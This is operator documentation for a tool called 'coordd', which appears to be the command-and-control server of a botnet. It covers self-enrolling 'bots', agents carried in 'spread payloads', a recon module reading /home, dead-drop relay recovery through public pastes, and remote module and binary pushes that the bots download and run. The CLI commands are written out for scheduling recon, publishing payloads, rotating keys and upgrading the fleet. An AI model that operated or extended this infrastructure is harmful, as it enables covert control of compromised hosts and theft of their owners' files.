# Coordinator

`coordd` is the fleet brain: it pulls results from relays, verifies them against
the signing agent, stores results and findings, and pushes scheduled tasks. It
closes the loop that `adminctl` used to require by hand.

## State and keys

A coordinator state directory holds:

- `agent.key` — coordinator signing key (tasks, module sets, rewards)
- `enc.key` — fleet encryption key
- `coord.key` — 0600 SQLCipher key for the database, created on first start
- `artifact.token` — optional shared gate on artifact uploads; agents are otherwise authorised by their own signature (see `docs/ARTIFACTS.md`)
- `artifact.key` — 0600 XChaCha20 key for stored artifact bytes, created on first start
- `findings.db` — SQLCipher database (`agents`, `results`, `findings`, `events`, `schedules`, `relay_cursors`)
- `relays.conf` — one `tier:priority:kind:url` per relay, same format as `adminctl relay`

Create it with `adminctl --state DIR keygen`, then add relays with
`adminctl --state DIR relay add 0:0:relay:https://relay.example`. `keygen`
also writes `coordinator.pub`; regenerate that file from an existing state with
`adminctl --state DIR pubkey --out FILE`.

## Identity

Agents self-enrol: the first heartbeat (encrypted under the public bootstrap key) carries the agent's public key and its own random encryption key. The coordinator stores both and encrypts everything to that agent from then on. Grants are optional and pin an explicit identity.

Agents verify tasks with `coordinator.pub` in their state directory. An
enrolment grant already names the coordinator key, and consuming a grant writes
`coordinator.pub` automatically. Carry it in spread payloads and `agentd install`
so new hosts trust the coordinator. Without it an agent falls back to its own key
and only accepts frames it signed itself (the single-key test setup).

The coordinator learns agents from heartbeats. A heartbeat repeats the agent
public key and is self-signed, and the header route tag must match that key, so
first contact needs no prior state.

## Run

```sh
coordd --state /srv/coord --cycle-ms 2000 --artifact-bind 127.0.0.1:8790
```

Each cycle pulls every relay since its stored cursor, processes frames, then
pushes due schedules. Cursors advance past malformed frames so one bad frame
cannot wedge a relay. Results are deduplicated by `(task_epoch, agent_pub)`;
finding envelopes in `stdout` are extracted with the same validator as
`adminctl db ingest`.

## Control

```sh
coordctl --state /srv/coord status
coordctl --state /srv/coord agents
coordctl --state /srv/coord revoke <tag>
coordctl --state /srv/coord schedule add <tag> recon.mod 0.1.0 --every 900 --jitter 120
coordctl --state /srv/coord schedule list
coordctl --state /srv/coord schedule remove 3
coordctl --state /srv/coord mod publish recon.mod 0.1.0 ./recon.wasm \
  --url https://files.example/recon.wasm --abi 2 --cap fs_read:/home/*
```

`revoke` stops scheduling but keeps history. `mod publish` builds a signed
module set and pushes it to a relay majority; agents fetch the module from `--url`
and verify the BLAKE3 digest. The URL must be reachable from the bots, not a
`file://` path.

## Dead drop

`dead_drop_url` in an agent's `config.toml` points at a URL returning one signed,
encrypted `RelaySet` frame. At startup, if set, the agent fetches it (10 s, 64 KiB
cap), verifies the coordinator signature, applies it to `relays.json`, and then
builds channels from the registry. This lets a bot recover relays from a public
paste/gist/CDN even when every baked-in relay is dead. Publish a frame with:

```sh
adminctl --state /srv/coord relay add 0:0:relay:https://new-relay
coordctl --state /srv/coord relay publish
```

The drop is read-only and needs no token: tampering is caught by the signature.
It is *not* a command dead drop; tasks still arrive over relays. A bot with a
dead drop URL but no reachable relay fetches the list and then connects to it.

## Key rotation

```sh
coordctl --state /srv/coord rotate
```

Generates a new coordinator key, pushes a `Rotate` frame signed by the old key,
then writes the new `agent.key` and keeps the old one as `agent.prev.key`. Agents
verify the frame with the current `coordinator.pub`, persist the rotation
generation in `rotation.state`, reject replays at or below it, and adopt the new
key. Heartbeats are agent-signed, so the coordinator keeps receiving them.

Rotate is one-way and immediate: a bot that misses the frame keeps the old key
and stops accepting new tasks and upgrades until it is updated out of band. Push
only when the fleet is online.

## Binary upgrade

```sh
coordctl --state /srv/coord upgrade ./agentd --url https://files.example/agentd --version 0.2.0
```

The agent downloads to `<exe>.new`, enforces the signed size and SHA-256, makes it
executable, and requests a restart. The supervisor promotes `.new` before the
next spawn, so a Windows host (where a running image cannot be renamed over) also
upgrades on the following cycle. The worker startup promotes a leftover `.new` in
worker-only deployments.

## Schedule model

`--every` is the period in seconds; `--jitter` adds a per-agent delay derived from
the route tag. A failed push (no relay majority) leaves `next_at` unchanged and is
retried on the next cycle. Agents with `revoked=1` are skipped.

## Honest limits

- Artifact upload is one POST per file with no resume; a row over 1 MiB cannot
  exist, and the agent drains only four rows per cycle.
- No task cancellation or priority queue; a slow module blocks its own agent, not
  the coordinator.
- The coordinator is a single process over SQLite WAL. Run one per database.
- No HTTP API yet: control is local CLI over the same state directory.
- Relays are plain HTTP unless you front them with TLS.
